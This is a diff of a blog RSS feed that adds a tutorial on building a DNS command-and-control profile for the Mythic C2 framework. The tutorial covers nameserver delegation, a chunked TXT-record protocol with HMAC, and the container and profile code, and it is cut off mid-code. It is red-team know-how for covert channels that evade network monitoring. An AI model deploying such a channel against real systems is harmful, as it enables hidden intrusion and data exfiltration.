@@ -6,8 +6,766 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 24 Apr 2026 13:55:03 +0100</lastBuildDate>
+        <lastBuildDate>Fri, 15 May 2026 14:24:06 +0100</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Building a Custom DNS C2 Profile for Mythic</title>
+            <link>/posts/dns_mythic/</link>
+            <pubDate>Fri, 15 May 2026 14:24:06 +0100</pubDate>
+            
+            <guid>/posts/dns_mythic/</guid>
+            <description>This post covers the full process of building a custom DNS command and control profile from scratch and integrating it into the Mythic C2 framework. This includes the DNS infrastructure setup, the Mythic C2 profile container, the protocol design, the agent-side transport, and the builder integration.
+Why DNS C2 Most network monitoring focuses on HTTP/HTTPS traffic. DNS is different, it&amp;rsquo;s treated as essential infrastructure and is almost never blocked outright. Firewalls that would catch an HTTP callback to an unknown IP will happily pass a DNS query to an external nameserver.</description>
+            <content type="html"><![CDATA[<p>This post covers the full process of building a custom DNS command and control profile from scratch and integrating it into the Mythic C2 framework. This includes the DNS infrastructure setup, the Mythic C2 profile container, the protocol design, the agent-side transport, and the builder integration.</p>
+<h2 id="why-dns-c2">Why DNS C2</h2>
+<p>Most network monitoring focuses on HTTP/HTTPS traffic. DNS is different, it&rsquo;s treated as essential infrastructure and is almost never blocked outright. Firewalls that would catch an HTTP callback to an unknown IP will happily pass a DNS query to an external nameserver. This makes DNS an ideal covert channel in restrictive environments.</p>
+<p>The tradeoff is bandwidth. DNS labels are limited to 63 characters each, and a full FQDN can&rsquo;t exceed 253 characters. You&rsquo;re not going to exfiltrate large files over DNS, but for task dispatch, small command output, and maintaining a beacon, it works very well.</p>
+<h2 id="how-it-works">How It Works</h2>
+<p>The fundamental idea is to abuse the DNS query/response cycle as a bidirectional communication channel:</p>
+<ul>
+<li><strong>The agent encodes data into DNS query names</strong> : for example, s.a9f4.0003.0014.aGVsbG8=.d4e8f2a1.infra.domain.name</li>
+<li><strong>Your VM is the authoritative nameserver for infra.domain.name</strong>, so all queries for that zone land on your machine directly</li>
+<li><strong>A Python DNS server on your VM decodes the query</strong>, processes it, and returns data in the TXT record of the response</li>
+<li>The agent reads the TXT response and reassembles it</li>
+</ul>
+<p>No HTTP. No TCP connections to suspicious IPs. From the network&rsquo;s perspective, it&rsquo;s just DNS traffic.</p>
+<h2 id="dns-infrastructure">DNS Infrastructure</h2>
+<h3 id="disabling-systemd-resolved-stub-listener">Disabling systemd-resolved Stub Listener</h3>
+<p>By default, Ubuntu&rsquo;s <code>systemd-resolved</code> binds to port 53 on localhost. This would conflict with our DNS server. We need to free up the port while keeping DNS resolution working.</p>
+<p>Edit the resolved config:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano /etc/systemd/resolved.conf
+</span></span></code></pre></div><p>Add or uncomment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>DNSStubListener<span style="color:#f92672">=</span>no
+</span></span></code></pre></div>
+    <img src="/mythic/dns/systemd.png"  alt="removing dns bind in systemdresolve"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Restart:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl restart systemd-resolved
+</span></span></code></pre></div><p>Verify the port is now free:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ss -tlnp | grep <span style="color:#ae81ff">53</span>
+</span></span></code></pre></div><p>DNS resolution still works because systemd-resolved continues to function via its socket at <code>/run/systemd/resolve/stub-resolv.conf</code>, it just no longer binds port 53.</p>
+<h3 id="opening-port-53-in-azure-nsg">Opening Port 53 in Azure NSG</h3>
+<p>Since the Mythic VM is on Azure, port 53 needs an inbound NSG rule for both TCP and UDP:</p>
+
+    <img src="/mythic/dns/NSG.png"  alt="NSG rule for DNS"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Both are needed, DNS uses UDP by default but falls back to TCP for large responses.</p>
+<h3 id="dns-delegation-in-cloudflare">DNS Delegation in Cloudflare</h3>
+<p>This is the key piece. We need to make our VM the authoritative nameserver for a subdomain of our domain. Everything under <code>infra.domain.name</code> needs to resolve by asking our VM, not Cloudflare.</p>
+<p>Add these two records in Cloudflare:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Name</th>
+<th>Value</th>
+<th>Proxy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td><code>ns1</code></td>
+<td><code>&lt;Mythic VM IP&gt;</code></td>
+<td>⚫ DNS only</td>
+</tr>
+<tr>
+<td>NS</td>
+<td><code>infra</code></td>
+<td><code>ns1.domain.name</code></td>
+<td>⚫ DNS only</td>
+</tr>
+</tbody>
+</table>
+<p>The NS record says: &ldquo;for anything under <code>infra.domain.name</code>, ask <code>ns1.domain.name</code>&rdquo;. The A record resolves <code>ns1.domain.name</code> to our VM. Both must be DNS only, <strong>no Cloudflare proxy</strong>.</p>
+
+    <img src="/mythic/dns/cloudflare_dns.png"  alt="Adding dns records"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Verify the delegation from an external machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig NS infra.domain.name
+</span></span><span style="display:flex;"><span>dig TXT test.infra.domain.name
+</span></span></code></pre></div><p>The NS query should return <code>ns1.domain.name</code>. The TXT query will time out or return SERVFAIL. Expected, since nothing is listening yet.</p>
+<h2 id="protocol-design">Protocol Design</h2>
+<p>Before writing any code, we designed the protocol. The constraints are:</p>
+<ul>
+<li>DNS labels: max 63 characters each</li>
+<li>Full FQDN: max 253 characters</li>
+<li>Data encoding: base64url (safe for DNS labels)</li>
+<li>Our domain <code>infra.domain.name</code> takes 18 characters plus dots</li>
+</ul>
+<p>This leaves roughly <strong>40 characters</strong> of usable data per chunk, we settled on 40 chars as our chunk size.</p>
+<h3 id="packet-structure">Packet Structure</h3>
+<p>Every DNS query from the agent follows this format:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>&lt;type&gt;.&lt;channel_id&gt;.&lt;seq&gt;.&lt;total&gt;.&lt;data&gt;.&lt;hmac&gt;.infra.domain.name
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Size</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>type</code></td>
+<td>1 char</td>
+<td>Message type: <code>r</code>, <code>s</code>, <code>p</code>, <code>e</code></td>
+</tr>
+<tr>
+<td><code>channel_id</code></td>
+<td>4 chars</td>
+<td>Hex channel ID assigned by server on registration</td>
+</tr>
+<tr>
+<td><code>seq</code></td>
+<td>4 chars</td>
+<td>Hex sequence number of this chunk</td>
+</tr>
+<tr>
+<td><code>total</code></td>
+<td>4 chars</td>
+<td>Hex total number of chunks</td>
+</tr>
+<tr>
+<td><code>data</code></td>
+<td>≤40 chars</td>
+<td>Base64url encoded chunk (padding stripped)</td>
+</tr>
+<tr>
+<td><code>hmac</code></td>
+<td>8 chars</td>
+<td>First 8 hex chars of HMAC-MD5 over <code>channel+seq+data</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="message-types">Message Types</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Direction</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>r</code></td>
+<td>Agent &ndash;&gt; Server</td>
+<td>Register : get a channel ID assigned</td>
+</tr>
+<tr>
+<td><code>s</code></td>
+<td>Agent &ndash;&gt; Server</td>
+<td>Send : transmit a data chunk</td>
+</tr>
+<tr>
+<td><code>p</code></td>
+<td>Agent &ndash;&gt; Server</td>
+<td>Poll : request next outbound chunk</td>
+</tr>
+<tr>
+<td><code>e</code></td>
+<td>Agent &ndash;&gt; Server</td>
+<td>End : signal done receiving</td>
+</tr>
+</tbody>
+</table>
+<h3 id="example-query">Example Query</h3>
+<p>A real registration query looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>r.amao.2g8c.infra.domain.name: type TXT, class IN
+</span></span></code></pre></div>
+    <img src="/mythic/dns/dns_reg.png"  alt="registering agent dns"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>A real send chunk looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>s.c7ff.0004.0014.MWRCWEVLencxNVdiL2xNdjR0RTZPbmNFQy9PZU5D.50106060.infra.domain.name: type TXT, class IN
+</span></span></code></pre></div>
+    <img src="/mythic/dns/dns_send.png"  alt="registering agent dns"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Breaking that down:</p>
+<ul>
+<li><code>s</code> = send type</li>
+<li><code>c7ff</code> = channel ID</li>
+<li><code>0004</code> = sequence 4 (hex)</li>
+<li><code>0014</code> = total 20 chunks (hex)</li>
+<li><code>MWRCWEV...</code> = 40 chars of base64url data</li>
+<li><code>6644e1b9</code> = HMAC integrity check</li>
+</ul>
+<h3 id="server-responses">Server Responses</h3>
+<p>The server responds with TXT records. Response values:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;4-char hex&gt;</code></td>
+<td>Registration response: your new channel ID</td>
+</tr>
+<tr>
+<td><code>&lt;4-char hex&gt;</code></td>
+<td>Send response: next expected sequence number</td>
+</tr>
+<tr>
+<td><code>DONE</code></td>
+<td>All chunks received, Mythic response is ready</td>
+</tr>
+<tr>
+<td><code>ERR</code></td>
+<td>HMAC verification failed</td>
+</tr>
+<tr>
+<td><code>&lt;chunk&gt;.&lt;hmac&gt;</code></td>
+<td>Poll response: data chunk with integrity check</td>
+</tr>
+<tr>
+<td><code>END</code></td>
+<td>Poll response: no more chunks</td>
+</tr>
+<tr>
+<td><code>IDLE</code></td>
+<td>Poll response: nothing ready yet</td>
+</tr>
+<tr>
+<td><code>ACK</code></td>
+<td>End acknowledgement</td>
+</tr>
+</tbody>
+</table>
+<h3 id="hmac-integrity">HMAC Integrity</h3>
+<p>Every chunk is signed with HMAC-MD5 using a shared secret (<code>weedns_secret</code> in our implementation). The agent computes:</p>
+
+    <img src="/mythic/dns/hmac.png"  alt="hmac secret"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>hmac_md5(<span style="color:#e6db74">&#34;weedns_secret&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>channel_id<span style="color:#e6db74">}{</span>seq<span style="color:#e6db74">}{</span>chunk_clean<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">8</span>]
+</span></span></code></pre></div><p>The server verifies the same. This prevents query spoofing and ensures chunk integrity. In a production engagement you would rotate this secret per payload.</p>
+<h3 id="full-cycle-data-flow">Full Cycle Data Flow</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>1. Agent: r.xxxx.xxxx.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;a9f4&#34;  (channel ID assigned)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>2. Agent: s.a9f4.0000.0014.&lt;chunk0&gt;.&lt;hmac&gt;.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;0001&#34;  (next expected seq)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   Agent: s.a9f4.0001.0014.&lt;chunk1&gt;.&lt;hmac&gt;.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;0002&#34;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   ... (20 chunks total) ...
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   Agent: s.a9f4.0013.0014.&lt;chunk19&gt;.&lt;hmac&gt;.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;DONE&#34;  (all received, Mythic response ready)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>3. Agent: p.a9f4.0000.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;&lt;chunk0&gt;.&lt;hmac&gt;&#34;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   Agent: p.a9f4.0001.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;&lt;chunk1&gt;.&lt;hmac&gt;&#34;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   ... (14 response chunks) ...
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   Agent: p.a9f4.000d.infra.domain.name
+</span></span><span style="display:flex;"><span>   Server: &#34;END&#34;
+</span></span></code></pre></div><h2 id="the-dns-c2-profile-container">The DNS C2 Profile Container</h2>
+<p>Mythic&rsquo;s C2 profiles run as Docker containers. Each profile consists of two parts:</p>
+<ul>
+<li>A <strong>Mythic-side definition</strong> that registers the profile, its parameters, and how to start the server</li>
+<li>A <strong>server script</strong> that handles the actual protocol</li>
+</ul>
+<p>We built ours in Python, mirroring the structure of the existing <code>weeagent</code> container.</p>
+<h3 id="directory-structure">Directory Structure</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>InstalledServices/dns_c2/
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── main.py
+</span></span><span style="display:flex;"><span>├── rabbitmq_config.json
+</span></span><span style="display:flex;"><span>└── dns_c2/
+</span></span><span style="display:flex;"><span>    ├── __init__.py
+</span></span><span style="display:flex;"><span>    ├── mythic/
+</span></span><span style="display:flex;"><span>    │   ├── __init__.py
+</span></span><span style="display:flex;"><span>    │   └── c2_functions/
+</span></span><span style="display:flex;"><span>    │       ├── __init__.py
+</span></span><span style="display:flex;"><span>    │       └── dns_c2.py          # Mythic profile definition
+</span></span><span style="display:flex;"><span>    └── c2_code/
+</span></span><span style="display:flex;"><span>        ├── config.json            # Port and domain config
+</span></span><span style="display:flex;"><span>        └── dns_server.py          # Actual DNS server
+</span></span></code></pre></div><h3 id="dockerfile">Dockerfile</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> itsafeaturemythic/mythic_python_base:latest</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /Mythic/</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> pip3 install dnslib aiohttp<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;python3&#34;</span>, <span style="color:#e6db74">&#34;main.py&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We use <code>dnslib</code> for DNS packet handling and <code>aiohttp</code> for forwarding messages to Mythic&rsquo;s internal HTTP API.</p>
+<h3 id="mainpy">main.py</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> mythic_container
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> dns_c2.mythic <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>mythic_container<span style="color:#f92672">.</span>mythic_service<span style="color:#f92672">.</span>start_and_run_forever()
+</span></span></code></pre></div><h3 id="rabbitmq_configjson">rabbitmq_config.json</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;mythic_user&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;mythic_password&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;virtual_host&#34;</span>: <span style="color:#e6db74">&#34;mythic_vhost&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;hostname&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;rabbitmq_password&#34;</span>: <span style="color:#e6db74">&#34;rabbitmq_password&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;rabbitmq_host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;mythic_server_host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;container_files_path&#34;</span>: <span style="color:#e6db74">&#34;/Mythic/&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="configjson">config.json</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;instances&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">53</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;domain&#34;</span>: <span style="color:#e6db74">&#34;infra.domain.name&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="mythic-profile-definition">Mythic Profile Definition</h3>
+<p>This file registers the profile with Mythic and defines the parameters shown in the UI when generating a payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.C2ProfileBase <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pathlib <span style="color:#f92672">import</span> Path
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> asyncio
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">dns_c2</span>(C2Profile):
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dns&#34;</span>
+</span></span><span style="display:flex;"><span>    description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DNS C2 profile using TXT records for covert communication&#34;</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@arvee&#34;</span>
+</span></span><span style="display:flex;"><span>    is_p2p <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    is_server_routed <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    server_folder_path <span style="color:#f92672">=</span> Path(<span style="color:#e6db74">&#34;/Mythic&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;dns_c2&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;c2_code&#34;</span>
+</span></span><span style="display:flex;"><span>    server_binary_path <span style="color:#f92672">=</span> server_folder_path <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;dns_server.py&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parameters <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dns_domain&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C2 DNS domain (delegated NS zone)&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;infra.domain.name&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>String,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dns_server&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IP of your authoritative DNS server (this VM)&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>String,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;callback_interval&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Callback interval in seconds&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>Number,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;callback_jitter&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Jitter percentage&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>Number,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;killdate&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Kill date&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#ae81ff">365</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>Date,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AESPSK&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Encryption Type&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aes256_hmac&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>            crypto_type<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;aes256_hmac&#34;</span>, <span style="color:#e6db74">&#34;none&#34;</span>],
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        C2ProfileParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;encrypted_exchange_check&#34;</span>,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Perform Key Exchange&#34;</span>,
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>ParameterType<span style="color:#f92672">.</span>Boolean,
+</span></span><span style="display:flex;"><span>            required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">config_check</span>(self, inputMsg: C2ConfigCheckMessage) <span style="color:#f92672">-&gt;</span> C2ConfigCheckMessageResponse:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> C2ConfigCheckMessageResponse(Success<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> inputMsg<span style="color:#f92672">.</span>Parameters<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dns_domain&#34;</span>):
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>Success <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>Error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dns_domain is required&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> inputMsg<span style="color:#f92672">.</span>Parameters<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dns_server&#34;</span>):
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>Success <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>Error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dns_server is required&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
